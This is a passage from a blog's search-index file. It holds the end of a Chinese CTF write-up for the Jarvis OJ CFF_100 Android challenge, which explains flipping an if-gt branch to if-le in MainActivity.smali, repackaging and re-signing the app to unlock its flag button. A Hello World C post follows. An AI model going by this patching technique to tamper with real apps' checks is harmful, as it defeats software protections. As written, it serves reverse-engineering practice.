title="接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮"></a>接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮<img src="/images/2/4.png" srcset="/img/loading.gif" alt></h3><p>找到smali文件夹下的com/ctf/test/ctf_100/MainActivity.smali,直接搜索<br>Btn_up_onclick方法，找到关键跳转，修改成相反的就行<img src="/images/2/5.png" srcset="/img/loading.gif" alt>将if-gt 修改成if-le后打包<img src="/images/2/6.png" srcset="/img/loading.gif" alt></p><h3 id="完成打包后签名"><a href="#完成打包后签名" class="headerlink" title="完成打包后签名"></a>完成打包后签名<img src="/images/2/7.png" srcset="/img/loading.gif" alt></h3><p>当出现<img src="/images/2/8.png" srcset="/img/loading.gif" alt><br>说明签名成功，再次拖入模拟器安装运行，爬一层，使爬到了，看flag按钮能够使用后，按爬到了，看flag按钮即可发现flag<br><img src="/images/2/9.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Jarvis OJ</tag>
      
      <tag>CFF_100</tag>
      
      <tag>Android reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/Hello-World.html"/>
    <url>/Hello-World.html</url>
    
    <content type="html"><![CDATA[<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><pre><code class="c">#include &lt;stdio.h&gt;int main(){    printf(&quot;Hello World&quot;);    return 0;}</code></pre>]]></content>
    
    
    <categories>
      
      <category>HelloWorld</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hello World</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
